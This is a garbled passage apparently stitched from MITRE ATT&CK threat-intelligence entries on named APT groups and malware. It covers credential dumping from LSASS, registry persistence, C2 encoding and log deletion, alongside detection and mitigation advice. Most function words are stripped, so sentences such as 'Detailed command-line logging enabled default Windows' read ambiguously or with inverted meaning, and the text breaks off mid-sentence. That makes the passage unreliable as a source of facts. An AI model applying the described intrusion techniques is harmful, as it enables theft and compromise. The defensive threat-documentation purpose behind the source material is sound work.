[Elderwood](https://attack.mitre.org/groups/G0066) download files compromised host remote location.(Citation: Symantec Ristol 2012) [HotCroissant](https://attack.mitre.org/software/S0431) ability identify IP address compromised machine.(Citation: US-CERT HOTCROISSANT February 2020) [FunnyDream](https://attack.mitre.org/software/S1044) Base64 encode C2 address stored template binary `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-` or
`xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=` character sets.(Citation: Bitdefender FunnyDream Campaign November 2020) [Netwalker](https://attack.mitre.org/software/S0457) DLL injected reflectively memory legitimate running process.(Citation: TrendMicro Netwalker 2020)	 [CostaBricks](https://attack.mitre.org/software/S0614) API calls, including `VirtualAlloc`, `VirtualFree`, `LoadLibraryA`, `GetProcAddress`, `ExitProcess`.(Citation: BlackBerry CostaRicto November 2020)  [Bumblebee](https://attack.mitre.org/software/S1039) uninstall loader `Sdl` command.(Citation: Proofpoint Bumblebee April 2022) [CharmPower](https://attack.mitre.org/software/S0674) ability enumerate `Uninstall` registry values.(Citation: Check APT35 CharmPower January 2022) [APT39](https://attack.mitre.org/groups/G0087) utilized tools capture mouse movements.(Citation: FBI FLASH APT39 September 2020) [QuasarRAT](https://attack.mitre.org/software/S0262) .NET wrapper DLL creating managing scheduled tasks maintaining persistence reboot.(Citation: Volexity Patchwork June 2018)(Citation: CISA AR18-352A Quasar RAT December 2018) [StrifeWater](https://attack.mitre.org/software/S1034) download updates auxiliary modules.(Citation: Cybereason StrifeWater Feb 2022) [Astaroth](https://attack.mitre.org/software/S0373) spawns CMD process execute commands. (Citation: Cybereason Astaroth Feb 2019) [CreepySnail](https://attack.mitre.org/software/S1024) execute `getUsername` compromised systems.(Citation: POLONIUM June 2022) [FunnyDream](https://attack.mitre.org/software/S1044) enumerate logical drives targeted machine.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) [TA505](https://attack.mitre.org/groups/G0092) injecting DLL winword.exe.(Citation: IBM TA505 April 2020) [APT32](https://attack.mitre.org/groups/G0050) backdoor uncommon TCP port (e.g 14146) backdoor configuration.(Citation: ESET OceanLotus Mar 2019) [POORAIM](https://attack.mitre.org/software/S0216) identify information, including battery status.(Citation: FireEye APT37 Feb 2018) [Flagpro](https://attack.mitre.org/software/S0696) <code>tasklist</code> command compromised system.(Citation: NTT Security Flagpro December 2021) [menuPass](https://attack.mitre.org/groups/G0045) Putty Secure Client (PSCP) transfer data.(Citation: PWC Cloud Hopper April 2017) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module rootkit system.(Citation: ClearSky Lebanese Cedar Jan 2021)  [MirageFox](https://attack.mitre.org/software/S0280) function decrypting data C2 configuration information.(Citation: APT15 Intezer June 2018) [Ember Bear](https://attack.mitre.org/groups/G1003) attempted lure victims executing malicious files.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [MacMa](https://attack.mitre.org/software/S1016) search specific file compromised enumerate files Desktop, Downloads, Documents folders.(Citation: ESET DazzleSpy Jan 2022) Monitor executed commands arguments detect token manipulation auditing command-line activity. Specifically, analysts runas command artifacts. Detailed command-line logging enabled default Windows.(Citation: Command-line Logging) [Squirrelwaffle](https://attack.mitre.org/software/S1030) executed `rundll32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) restriction custom time providers registrations, require DLL payload written disk. (Citation: Github W32Time Oct 2017) [KOCTOPUS](https://attack.mitre.org/software/S0669) set AutoRun Registry key PowerShell command.(Citation: MalwareBytes LazyScripter Feb 2021) [GrimAgent](https://attack.mitre.org/software/S0632) data compromise host C2 channel.(Citation: IB GrimAgent July 2021) Users trained identify social engineering techniques spearphishing emails malicious links. Monitor unexpected processes interacting lsass.exe.(Citation: Medium Detecting Attempts Steal Passwords Memory) Common credential dumpers [Mimikatz](https://attack.mitre.org/software/S0002) access LSA Subsystem Service (LSASS) process process, locating LSA secrets key, decrypting sections memory credential details stored. Credential dumpers methods reflective [Process Injection](https://attack.mitre.org/techniques/T1055) reduce potential indicators malicious activity.
##### Linux
To passwords hashes stored memory, processes maps file /proc filesystem process analyzed. file stored path <code>/proc/&lt;pid&gt;/maps</code>, <code>&lt;pid&gt;</code> directory unique pid program interrogated authentication data. AuditD monitoring tool, ships stock Linux distributions, watch hostile processes file proc file system, alerting pid, process name, arguments programs. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects OS name.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021) [PLEAD](https://attack.mitre.org/software/S0435) harvest saved credentials browsers Google Chrome, Internet Explorer, Mozilla Firefox.(Citation: TrendMicro BlackTech June 2017)(Citation: ESET PLEAD Malware July 2018) [Rising Sun](https://attack.mitre.org/software/S0448) modify file attributes hide files.(Citation: McAfee Sharpshooter December 2018) [Bundlore](https://attack.mitre.org/software/S0482) permissions payload command <code>chmod -R 755</code>.(Citation: 20 macOS Common Tools Techniques) Monitor contextual data account, include username, user ID, environmental data attempt hide artifacts behaviors evade detection. [FatDuke](https://attack.mitre.org/software/S0512) packed junk code strings.(Citation: ESET Dukes October 2019) [APT41](https://attack.mitre.org/groups/G0096) VMProtected binaries multiple intrusions.(Citation: FireEye APT41 March 2020) [Mythic](https://attack.mitre.org/software/S0699) list C2 URLs fallback mechanisms IP domain blocked.(Citation: Mythc Documentation)	 (Citation: Dell TG-1314) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) `ps ax | grep <name> | grep -v grep | ...` `ps ax | grep -E...` conduct process discovery.(Citation: SentinelLabs reversing run-only applescripts 2021) Monitor processes viewed inject malicious code suspended hollowed processes evade process-based defenses. [Ramsay](https://attack.mitre.org/software/S0458) base64 encode C2 traffic.(Citation: Antiy CERT Ramsay April 2020) [Ramsay](https://attack.mitre.org/software/S0458) Windows API schedule tasks maintain persistence.(Citation: Eset Ramsay 2020) [Siloscape](https://attack.mitre.org/software/S0623) impersonates main thread <code>CExecSvc.exe</code> calling <code>NtImpersonateThread</code>.(Citation: Unit 42 Siloscape Jun 2021) [BoomBox](https://attack.mitre.org/software/S0635) upload data dedicated per-victim folders Dropbox.(Citation: MSTIC Nobelium Toolset 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) acquired Amazon S3 buckets C2.(Citation: Check APT35 CharmPower January 2022) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control.(Citation: Cisco IOS Software Integrity Assurance - TACACS) [Fgdump](https://attack.mitre.org/software/S0120) dump Windows password hashes.(Citation: Mandiant APT1) application whitelisting configured block execution InstallUtil.exe required network prevent potential misuse adversaries. [SMOKEDHAM](https://attack.mitre.org/software/S0649) fronted domain obfuscate hard-coded C2 server domain.(Citation: FireEye SMOKEDHAM June 2021) [Kazuar](https://attack.mitre.org/software/S0265) obtains list running processes WMI querying.(Citation: Unit 42 Kazuar 2017) [Silence](https://attack.mitre.org/groups/G0091) Windows command-line commands.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) lured targets malicious files gain execution target environment.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020) [Leafminer](https://attack.mitre.org/groups/G0077) tool called MailSniper search Exchange server mailboxes keywords.(Citation: Symantec Leafminer July 2018) [xCaon](https://attack.mitre.org/software/S0653) decoded strings C2 server executing commands.(Citation: Checkpoint IndigoZebra July 2021)  [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors local account credentials intrusion lateral movement privilege escalation.(Citation: FoxIT Wocao December 2019) possible, Remote Desktop Gateway manage connections security configuration RDP network. (Citation: TechNet RDP Gateway) email delegation required, disable it. Google Workspace accomplished Google Admin console.(Citation: Gmail Delegation) [ROKRAT](https://attack.mitre.org/software/S0240) HTTPS command control communication.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018)(Citation: Malwarebytes RokRAT VBA January 2021) inspect HTTPS traffic, captures analyzed connections domain fronting. host-based security software block LLMNR/NetBIOS traffic. Enabling SMB Signing NTLMv2 relay attacks.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)(Citation: SMB Packet Signing) Monitor windows registry values delete alter generated artifacts host system, including logs captured files quarantined malware. [Goopy](https://attack.mitre.org/software/S0477) ability maintain persistence creating scheduled tasks set hour.(Citation: Cybereason Cobalt Kitty 2017)	 [APT41](https://attack.mitre.org/groups/G0096) storescyncsvc.dll BEACON backdoor download secondary backdoor.(Citation: FireEye APT41 March 2020) (Citation: TrendMicro EarthLusca 2022) [GrimAgent](https://attack.mitre.org/software/S0632) ability add bytes change file hash.(Citation: IB GrimAgent July 2021) [Dragonfly](https://attack.mitre.org/groups/G0035) PowerShell scripts execution.(Citation: US-CERT TA18-074A)(Citation: Symantec Dragonfly Sept 2017) (Citation: Symantec Buckeye) [StrongPity](https://attack.mitre.org/software/S0491) bundled legitimate software installation files disguise.(Citation: Talos Promethium June 2020) [LitePower](https://attack.mitre.org/software/S0680) create scheduled task enable persistence mechanisms.(Citation: Kaspersky WIRTE November 2021) [SDBbot](https://attack.mitre.org/software/S0461) ability XOR strings installer component hardcoded 128 byte key.(Citation: Proofpoint TA505 October 2019) [Koadic](https://attack.mitre.org/software/S0250) scan local network SMB.(Citation: Github Koadic) Monitor logs API calls disable logging. AWS, monitor for: <code>StopLogging</code> <code>DeleteTrail</code>.(Citation: Stopping CloudTrail Sending Events CloudWatch Logs) GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs) Azure, monitor <code>az monitor diagnostic-settings delete</code>.(Citation: monitor diagnostic-settings) Additionally, sudden loss log source disabled. Monitor executed commands arguments establish persistence executing malicious content triggered hijacked references Component Object Model (COM) objects. execution, [Metamorfo](https://attack.mitre.org/software/S0455) unzipped downloaded performed string decryption.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019)  [Empire](https://attack.mitre.org/software/S0363) persist modifying .LNK file include backdoor.(Citation: Github PowerShell Empire) [Astaroth](https://attack.mitre.org/software/S0373) collects data plaintext file named r1.log exfiltration. (Citation: Cofense Astaroth Sept 2018) [Anchor](https://attack.mitre.org/software/S0504) packed payload.(Citation: Cyberreason Anchor December 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) determine anti-virus product installed resolution service's virtual SID.(Citation: Security Affairs SILENTTRINITY July 2019) [Pony](https://attack.mitre.org/software/S0453) scripts delete execution.(Citation: Malwarebytes Pony April 2016)	 [TajMahal](https://attack.mitre.org/software/S0467) ability steal data clipboard infected host.(Citation: Kaspersky TajMahal April 2019)
 [Winnti Group](https://attack.mitre.org/groups/G0044) stolen certificates sign malware.(Citation: Kaspersky Winnti April 2013) Monitor unusual Exchange Office 365 email account permissions excessively broad permissions granted compromised accounts. [FlawedAmmyy](https://attack.mitre.org/software/S0381) execute batch scripts delete files.(Citation: Korean FSI TA505 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) overwrite `C:\Windows\System32\winevt\Logs` file targeted system.(Citation: ESET Hermetic Wizard March 2022) [Proton](https://attack.mitre.org/software/S0279) kills security tools Wireshark running.(Citation: objsee mac malware 2017) [CHOPSTICK](https://attack.mitre.org/software/S0023) encrypts C2 communications RC4.(Citation: ESET Sednit 2) (Citation: Leonardo Turla Penquin 2020) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors named binary file `compareForfor.jpg` disguise JPG file.(Citation: DFIR Conti Bazar Nov 2021) [Dragonfly](https://attack.mitre.org/groups/G0035) exploited Windows Netlogon vulnerability (CVE-2020-1472) access Windows Active Directory servers.(Citation: CISA AA20-296A Berserk Bear December 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) ability extract credentials Registry.(Citation: SentinelLabs Agent Tesla Aug 2020)  [Empire](https://attack.mitre.org/software/S0363) modules discover exploit DLL hijacking opportunities.(Citation: Github PowerShell Empire) [KGH_SPY](https://attack.mitre.org/software/S0526) decrypt encrypted strings write newly created folder.(Citation: Cybereason Kimsuky November 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools registered registry malicious VBS files persistence.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021) [TURNEDUP](https://attack.mitre.org/software/S0199) capable writing Registry key establish.(Citation: CyberBit Bird Apr 2018) [CostaBricks](https://attack.mitre.org/software/S0614) ability bytecode decrypt embedded payloads.(Citation: BlackBerry CostaRicto November 2020) (Citation: Baumgartner Naikon 2015) [STARWHALE](https://attack.mitre.org/software/S1037) stored collected data file called `stari.txt`.(Citation: Mandiant UNC3313 Feb 2022) Ensure user accounts administrative rights follow practices, including privileged access workstations, Time/Just Administration (JIT/JEA), strong authentication. Reduce users highly privileged Directory Roles.(Citation: SolarWinds Customer Guidance) [More_eggs](https://attack.mitre.org/software/S0284) capability gather username victim's machine.(Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [TEMP.Veles](https://attack.mitre.org/groups/G0088) [Mimikatz](https://attack.mitre.org/software/S0002) custom tool, SecHack, harvest credentials. (Citation: FireEye TRITON 2019) Monitor certificate-based authentication events, EID 4768 certificate Kerberos authentication (especially don’t correspond legitimately issued certificates) Secure Channel (`Schannel`, SSL/TLS) highlighted `Logon Process` EID 4624 logon event.(Citation: SpecterOps Certified Pre Owned) [Threat Group-3390](https://attack.mitre.org/groups/G0027) staged tools, including [gsecdump](https://attack.mitre.org/software/S0008) WCE, compromised websites.(Citation: Dell TG-3390) [TA551](https://attack.mitre.org/groups/G0127) masked malware DLLs dat jpg files.(Citation: Unit 42 TA551 Jan 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Catchamas](https://attack.mitre.org/software/S0261) captures screenshots based specific keywords window’s title.(Citation: Symantec Catchamas April 2018) Block unknown unused attachments default transmitted email practice prevent vectors, .scr, .exe, .pif, .cpl, etc. email scanning devices analyze compressed encrypted formats, zip rar conceal malicious attachments. [TeamTNT](https://attack.mitre.org/groups/G0139) developed custom malware [Hildegard](https://attack.mitre.org/software/S0601).(Citation: Unit 42 Hildegard Malware) [menuPass](https://attack.mitre.org/groups/G0045) Csvde tool collect Active Directory files data.(Citation: Symantec Cicada November 2020) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [RogueRobin](https://attack.mitre.org/software/S0270) decodes embedded executable base64 decompresses it.(Citation: Unit42 DarkHydrus Jan 2019) [Turla](https://attack.mitre.org/groups/G0010) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-ReflectivePEInjection.ps1</code> reflectively load PowerShell payload random process victim system.(Citation: ESET Turla PowerShell 2019) [Indrik Spider](https://attack.mitre.org/groups/G0119) attempted users malicious zipped file.(Citation: Symantec WastedLocker June 2020)  [Conficker](https://attack.mitre.org/software/S0608) variants Windows AUTORUN feature spread USB propagation.(Citation: SANS Conficker)(Citation: Trend Micro Conficker) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) Dropbox C2 allowing upload download files execution arbitrary commands.(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) [Cannon](https://attack.mitre.org/software/S0351) download payload execution.(Citation: Unit42 Cannon Nov 2018) [POORAIM](https://attack.mitre.org/software/S0216) delivered compromised sites acting watering holes.(Citation: FireEye APT37 Feb 2018) Ensure proper permissions set Registry prevent users modifying code signing policies. [Koadic](https://attack.mitre.org/software/S0250) Rundll32 execute additional payloads.(Citation: Github Koadic) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [DustySky](https://attack.mitre.org/software/S0062) collects running processes victims.(Citation: DustySky)(Citation: Kaspersky MoleRATs April 2019) (Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019) [menuPass](https://attack.mitre.org/groups/G0045) registered malicious domains intrusion campaigns.(Citation: DOJ APT10 Dec 2018)(Citation: District Court NY APT10 Indictment December 2018) [APT19](https://attack.mitre.org/groups/G0073) launched malware variant Port 22 malware variant legitimate executable loaded malicious DLL.(Citation: Unit 42 C0d0so0 Jan 2016) [Dragonfly](https://attack.mitre.org/groups/G0035) types scripting perform operations, including Python scripts. observed installing Python 2.7 victim.(Citation: US-CERT TA18-074A) Ensure proper process file permissions prevent adversaries disabling interfering security services. Check integrity existing BIOS device firmware determine vulnerable modification. (Citation: Forcepoint Monsoon) [The White Company](https://attack.mitre.org/groups/G0089) checked current victim system.(Citation: Cylance Shaheen Nov 2018) [dsquery](https://attack.mitre.org/software/S0105) gather permission domain.(Citation: TechNet Dsquery) [IcedID](https://attack.mitre.org/software/S0483) ability identify OS version compromised host.(Citation: IBM IcedID November 2017) [Bazar](https://attack.mitre.org/software/S0534) create add files Registry establish persistence.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [PUNCHTRACK](https://attack.mitre.org/software/S0197) aggregates collected data tmp file.(Citation: FireEye Enemy FIN8 Aug 2016) [Mongall](https://attack.mitre.org/software/S1026) establish persistence auto start function including `EverNoteTrayUService`.(Citation: SentinelOne Aoqin Dragon June 2022)
 Monitor newly constructed files to/from lateral tool transfer  [PoetRAT](https://attack.mitre.org/software/S0428) Python tool named Browdec.exe steal browser credentials.(Citation: Talos PoetRAT April 2020) [Ke3chang](https://attack.mitre.org/groups/G0004) keyloggers.(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [APT41](https://attack.mitre.org/groups/G0096) WMI ways, including execution commands WMIEXEC persistence [PowerSploit](https://attack.mitre.org/software/S0194).(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) <code>net use</code> identify establish network connection remote host.(Citation: Kaspersky ThreatNeedle Feb 2021) Ensure proper user permissions prevent adversaries disabling interfering logging. [JHUHUGIT](https://attack.mitre.org/software/S0044) retrieve additional payload C2 server.(Citation: ESET Sednit 1)(Citation: Unit 42 Sofacy Feb 2018) [JHUHUGIT](https://attack.mitre.org/software/S0044) command download files victim’s machine.(Citation: Talos Seduploader Oct 2017) File encryption enforced email communications sensitive access email services. [GoldMax](https://attack.mitre.org/software/S0588) impersonated systems management software avoid detection.(Citation: MSTIC NOBELIUM Mar 2021) [PipeMon](https://attack.mitre.org/software/S0501) check presence ESET Kaspersky security software.(Citation: ESET PipeMon 2020) [Shark](https://attack.mitre.org/software/S1019) stored folders named `U1` `U2` prior exfiltration.(Citation: ClearSky Siamesekitten August 2021) [PLATINUM](https://attack.mitre.org/groups/G0068) renamed rar.exe avoid detection.(Citation: Twitter ItsReallyNick Platinum Masquerade) [Wizard Spider](https://attack.mitre.org/groups/G0102) services.exe execute scripts executables lateral movement victim network.(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 5 Hours October 2020) Restrict execution Msiexec.exe privileged accounts lessen opportunities malicious usage. [Cyclops Blink](https://attack.mitre.org/software/S0687) DNS HTTPS (DoH) resolve C2 nodes.(Citation: Trend Micro Cyclops Blink March 2022) [Drovorub](https://attack.mitre.org/software/S0502) download files compromised host.(Citation: NSA/FBI Drovorub August 2020) [CHOPSTICK](https://attack.mitre.org/software/S0023) encrypts C2 communications TLS.(Citation: ESET Sednit 2) [KOMPROGO](https://attack.mitre.org/software/S0156) capable creating reverse shell.(Citation: FireEye APT32 2017) [QuasarRAT](https://attack.mitre.org/software/S0262) perform webcam viewing.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [Smoke Loader](https://attack.mitre.org/software/S0226) launches scheduled task.(Citation: Talos Smoke Loader July 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) established persistence Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run shortcut startup folder.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020) [Industroyer](https://attack.mitre.org/software/S0604) decrypts code connect remote C2 server.(Citation: ESET Industroyer) [DarkWatchman](https://attack.mitre.org/software/S0673) collected username victim machine.(Citation: Prevailion DarkWatchman 2021) [Ke3chang](https://attack.mitre.org/groups/G0004) dumped credentials, including gsecdump.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) Monitor newly executed processes erase contents storage devices specific systems network interrupt availability network resources. [RATANKBA](https://attack.mitre.org/software/S0241) gathers OS architecture, OS name, OS version/Service pack.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [StrifeWater](https://attack.mitre.org/software/S1034) delete cover tracks.(Citation: Cybereason StrifeWater Feb 2022) Monitor domain controller logs replication requests unscheduled activity DCSync. (Citation: DRSR Dec 2017) (Citation: GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers log replication requests originating default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Monitor replication requests (Citation: SAMR) IPs domain controllers. (Citation: AdSecurity DCSync Sept 2015) [APT29](https://attack.mitre.org/groups/G0016) forms spearphishing attempting user attachments, including, limited to, malicious Word documents, .pdf, .lnk files. (Citation: F-Secure Dukes) (Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: ESET T3 Threat Report 2021)(Citation: Secureworks IRON HEMLOCK Profile) [Empire](https://attack.mitre.org/software/S0363) module creating domain user permissions allow.(Citation: Github PowerShell Empire) (Citation: Crowdstrike GTR2020 Mar 2020) [Anchor](https://attack.mitre.org/software/S0504) NTFS hide files.(Citation: Cyberreason Anchor December 2019) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) enumerate hosts gather username, machine name, administrative permissions information.(Citation: Talos Frankenstein June 2019) [SombRAT](https://attack.mitre.org/software/S0615) legitimate process hide itself.(Citation: CISA AR21-126A FIVEHANDS 2021) [Confucius](https://attack.mitre.org/groups/G0142) lured victims execute malicious attachments included crafted spearphishing emails current topics.(Citation: Uptycs Confucius APT Jan 2021) [Carbanak](https://attack.mitre.org/software/S0030) exfiltrates data compressed chunks message larger 4096 bytes .(Citation: FireEye CARBANAK June 2017) [Sandworm Team](https://attack.mitre.org/groups/G0034) valid emails addresses conducting target organizations subsequently spearphishing campaigns.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Turla](https://attack.mitre.org/groups/G0010) abused local accounts password victim’s network.(Citation: ESET Crutch December 2020) (Citation: Trend Micro IXESHE 2012) [ComRAT](https://attack.mitre.org/software/S0126) task Windows SQM Consolidator.(Citation: ESET ComRAT 2020) [GRIFFON](https://attack.mitre.org/software/S0417) PowerShell execute Meterpreter downloader TinyMet.(Citation: SecureList Griffon 2019) [PoisonIvy](https://attack.mitre.org/software/S0012) captures window titles.(Citation: Symantec Darkmoon Aug 2005) [MuddyWater](https://attack.mitre.org/groups/G0069) exploited Exchange memory corruption vulnerability (CVE-2020-0688).(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Deep Panda](https://attack.mitre.org/groups/G0009) net.exe connect network shares <code>net use</code> commands compromised credentials.(Citation: Alperovitch 2014) [TajMahal](https://attack.mitre.org/software/S0467) encrypted Virtual File store plugins.(Citation: Kaspersky TajMahal April 2019) [FIN7](https://attack.mitre.org/groups/G0046) captured screenshots desktop video recordings.(Citation: DOJ FIN7 Aug 2018) [Reaver](https://attack.mitre.org/software/S0172) queries Registry determine correct Startup path persistence.(Citation: Palo Alto Reaver Nov 2017) [Rover](https://attack.mitre.org/software/S0090) keylogging functionality.(Citation: Palo Alto Rover) [Cardinal RAT](https://attack.mitre.org/software/S0348) capture screenshots.(Citation: PaloAlto CardinalRat Apr 2017) [Metamorfo](https://attack.mitre.org/software/S0455) searched Program Files directories specific folders searched strings mutexes.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020)(Citation: FireEye Metamorfo Apr 2018)  [PoshC2](https://attack.mitre.org/software/S0378) decrypt passwords stored RDCMan configuration file.(Citation: SecureWorks August 2019) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module port scanner system.(Citation: ClearSky Lebanese Cedar Jan 2021)  application control prevent execution hh.exe required network prevent potential misuse adversaries. administrator accounts permissions add component software services day-to-day operations expose potential adversaries unprivileged systems. [Skidmap](https://attack.mitre.org/software/S0468) ability set SELinux permissive mode.(Citation: Trend Micro Skidmap) [Penquin](https://attack.mitre.org/software/S0587) delete downloaded executables running them.(Citation: Leonardo Turla Penquin 2020) [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered automatically, instruction C2, user host machine compiled report operators.(Citation: FOX-IT 2016 Mofang) [Hildegard](https://attack.mitre.org/software/S0601) BOtB tool break containers. (Citation: Unit 42 Hildegard Malware)  [APT41](https://attack.mitre.org/groups/G0096) keylogger called GEARSHIFT target system.(Citation: FireEye APT41 Aug 2019) [Denis](https://attack.mitre.org/software/S0354) obfuscates code encrypts API names. [Denis](https://attack.mitre.org/software/S0354) encodes payload Base64.(Citation: Securelist Denis April 2017)(Citation: Cybereason Cobalt Kitty 2017) application control configured block execution mavinject.exe required network prevent potential misuse adversaries. [KGH_SPY](https://attack.mitre.org/software/S0526) collect credentials WINSCP.(Citation: Cybereason Kimsuky November 2020) [RedLeaves](https://attack.mitre.org/software/S0153) capable downloading file URL.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Attor](https://attack.mitre.org/software/S0438) file uploader plugin automatically exfiltrates collected data log files C2 server.(Citation: ESET Attor Oct 2019) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) named `srvdll.dll` legitimate service.(Citation: SentinelOne Aoqin Dragon June 2022) [Gelsemium](https://attack.mitre.org/software/S0666) named malicious binaries `serv.exe`, `winprint.dll`, `chrome_elf.dll` set persistence Registry key <code>Chrome Update</code> legitimate.(Citation: ESET Gelsemium June 2021) [APT32](https://attack.mitre.org/groups/G0050) established persistence Registry keys, execute PowerShell VBS scripts execute backdoor directly.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019) [Cyclops Blink](https://attack.mitre.org/software/S0687) non-standard ports C2 typically HTTPS traffic.(Citation: NCSC Cyclops Blink February 2022) Restrict file shares specific directories access users. Monitor unexpected/abnormal access files malicious collection local data, user files (pdf, .docx, .jpg, etc.) local databases. [FrameworkPOS](https://attack.mitre.org/software/S0503) XOR credit card exfiltration.(Citation: SentinelOne FrameworkPOS September 2019) [Agent.btz](https://attack.mitre.org/software/S0092) saves XML file XOR-encoded.(Citation: ThreatExpert Agent.btz) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. [TrickBot](https://attack.mitre.org/software/S0266) gather domain trusts utilizing [Nltest](https://attack.mitre.org/software/S0359).(Citation: Fortinet TrickBot)(Citation: Cyberreason Anchor December 2019) [APT38](https://attack.mitre.org/groups/G0082) leveraged Sysmon understand processes, services organization.(Citation: FireEye APT38 Oct 2018) [JSS Loader](https://attack.mitre.org/software/S0648) ability download malicious executables compromised host.(Citation: CrowdStrike Carbon Spider August 2021) [CORESHELL](https://attack.mitre.org/software/S0137) C2 messages encrypted custom stream ciphers six-byte eight-byte keys.(Citation: FireEye APT28) Specific developer utilities environment removed used. [NETWIRE](https://attack.mitre.org/software/S0198) downloaded payloads C2 compromised host.(Citation: FireEye NETWIRE March 2019)(Citation: Proofpoint NETWIRE December 2020) [CoinTicker](https://attack.mitre.org/software/S0369) downloads EggShell mach-o binary curl, set quarantine flag.(Citation: CoinTicker 2019) [KONNI](https://attack.mitre.org/software/S0356) created shortcut called "Anti virus service.lnk" apparent attempt masquerade legitimate file.(Citation: Talos Konni 2017) [Downdelph](https://attack.mitre.org/software/S0134) search hijacking Windows executable sysprep.exe escalate privileges.(Citation: ESET Sednit 3) [HAFNIUM](https://attack.mitre.org/groups/G0125) TCP C2.(Citation: HAFNIUM March 2020) [Azorult](https://attack.mitre.org/software/S0344) collect list running processes calling CreateToolhelp32Snapshot.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) Monitor newly executed processes attempt executable file difficult discover analyze encrypting, encoding, obfuscating contents transit. [SHARPSTATS](https://attack.mitre.org/software/S0450) ability identify username compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) (Citation: Trend Micro Daserf Nov 2017)(Citation: Symantec Tick Apr 2016) requiring password, adversary terminal access, password sudoers file. Setting <code>timestamp_timeout</code> 0 require user input password time <code>sudo</code> executed. [Kimsuky](https://attack.mitre.org/groups/G0094) accounts specific <code>net localgroup</code>.(Citation: KISA Operation Muzabi) [Dragonfly](https://attack.mitre.org/groups/G0035) list hosts victim environment.(Citation: US-CERT TA18-074A) [XCSSET](https://attack.mitre.org/software/S0658) saves screen capture victim's numbered filename <code>.jpg</code> extension. Screen captures intervals based system. (Citation: trendmicro xcsset xcode project 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) exploited Netlogon vulnerability (CVE-2020-1472).(Citation: DHS CISA AA22-055A MuddyWater February 2022) [APT37](https://attack.mitre.org/groups/G0067) created scheduled tasks malicious scripts compromised 